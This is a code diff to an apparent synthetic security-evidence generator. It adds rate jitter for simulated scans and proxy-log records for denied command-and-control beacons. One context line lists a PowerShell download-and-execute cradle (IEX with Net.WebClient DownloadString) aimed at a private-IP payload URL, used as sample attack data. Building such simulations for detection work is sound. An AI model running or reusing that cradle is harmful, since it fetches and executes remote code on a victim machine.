@@ -134,6 +134,19 @@ def _iter_periodic_ticks(
         t += interval_sec
 
 
+def _effective_rate_interval(rate: float, count: int | None, rng) -> float:
+    """Return interval for rate-based bulk events.
+
+    Explicit count-based events stay exact. Duration/end-time based events treat
+    rate as an average throughput and apply deterministic per-campaign drift so
+    repeated scans with the same nominal rate do not produce identical counts.
+    """
+    effective_rate = rate
+    if count is None:
+        effective_rate *= rng.uniform(0.82, 1.18)
+    return 1.0 / effective_rate
+
+
 # Realistic decoded PowerShell commands for base64 encoding
 POWERSHELL_COMMANDS = [
     "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
@@ -1225,8 +1238,10 @@ class StorylineMixin:
                 service = service or (
                     "ssl" if spec.dst_port == 443 else "http" if spec.dst_port == 80 else "ssl"
                 )
-                # Build HttpContext if HTTP fields are provided
-                if spec.method or spec.uri:
+                # Build HttpContext if HTTP/proxy-visible request metadata is provided.
+                # HTTPS CONNECT beacons still need this for proxy User-Agent fidelity
+                # even though no origin-side Zeek http.log is emitted for TLS.
+                if spec.method or spec.uri or spec.user_agent:
                     from evidenceforge.events.contexts import HttpContext
 
                     _method = spec.method or "GET"
@@ -1291,16 +1306,70 @@ class StorylineMixin:
             ):
                 self.state_manager.set_current_time(tick_time)
                 if spec.action == "deny":
-                    self.activity_generator.generate_connection(
-                        src_ip=beacon_src_ip,
-                        dst_ip=spec.dst_ip,
-                        time=tick_time,
-                        dst_port=spec.dst_port,
-                        proto=spec.protocol,
-                        conn_state=deny_conn_state,
-                        firewall=fw_ctx,
-                        emit_dns=False,
+                    proxy_chain = getattr(self.activity_generator, "_proxy_routes", {}).get(
+                        beacon_src_ip
                     )
+                    explicit_proxy = (
+                        getattr(self.activity_generator, "_proxy_mode", "transparent") == "explicit"
+                        and proxy_chain
+                        and spec.protocol == "tcp"
+                        and spec.dst_port in (80, 443)
+                    )
+                    if explicit_proxy:
+                        from evidenceforge.events.contexts import ProxyContext
+
+                        proxy_sys = proxy_chain[0]
+                        beacon_host = spec.hostname or spec.dst_ip
+                        proxy_method = "CONNECT" if spec.dst_port == 443 else (spec.method or "GET")
+                        proxy_url = (
+                            f"{beacon_host}:443"
+                            if proxy_method == "CONNECT"
+                            else f"http://{beacon_host}{spec.uri or '/'}"
+                        )
+                        proxy_ctx = ProxyContext(
+                            client_ip=beacon_src_ip,
+                            method=proxy_method,
+                            url=proxy_url,
+                            host=beacon_host,
+                            status_code=403,
+                            sc_bytes=rng.randint(500, 2000),
+                            cs_bytes=rng.randint(180, 520),
+                            time_taken=rng.randint(20, 1500),
+                            user_agent=spec.user_agent or "Mozilla/5.0",
+                            content_type="text/html",
+                            cache_result="DENIED",
+                            referrer=spec.referrer or "",
+                            proxy_fqdn=self.activity_generator._proxy_fqdn(proxy_sys),
+                        )
+                        self.activity_generator.generate_connection(
+                            src_ip=beacon_src_ip,
+                            dst_ip=spec.dst_ip,
+                            time=tick_time,
+                            dst_port=spec.dst_port,
+                            proto=spec.protocol,
+                            service="ssl" if spec.dst_port == 443 else "http",
+                            duration=rng.uniform(0.05, 2.0),
+                            orig_bytes=s_ob,
+                            resp_bytes=s_rb,
+                            conn_state="SF",
+                            emit_dns=emit_dns and attempt_count == 0,
+                            source_system=src_sys,
+                            http=http_ctx,
+                            proxy=proxy_ctx,
+                            hostname=conn_hostname if conn_hostname is not None else spec.hostname,
+                            pid=getattr(self, "_last_storyline_pid", -1) or -1,
+                        )
+                    else:
+                        self.activity_generator.generate_connection(
+                            src_ip=beacon_src_ip,
+                            dst_ip=spec.dst_ip,
+                            time=tick_time,
+                            dst_port=spec.dst_port,
+                            proto=spec.protocol,
+                            conn_state=deny_conn_state,
+                            firewall=fw_ctx,
+                            emit_dns=False,
+                        )
                 else:
                     # Allow DNS only on the first tick; cache handles the rest
                     self.activity_generator.generate_connection(
@@ -1421,7 +1490,6 @@ class StorylineMixin:
 
             # Timing: rate-based → convert to interval
             start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
-            interval_sec = 1.0 / spec.rate
             duration_sec = None
             count = spec.count
             if spec.duration is not None:
@@ -1429,6 +1497,7 @@ class StorylineMixin:
             elif spec.end_time is not None:
                 end_dt = self._parse_storyline_time(spec.end_time)
                 duration_sec = (end_dt - start).total_seconds()
+            interval_sec = _effective_rate_interval(spec.rate, count, rng)
 
             scan_src_ip = spec.source_ip or system.ip
             scan_host = spec.hostname or spec.dst_ip
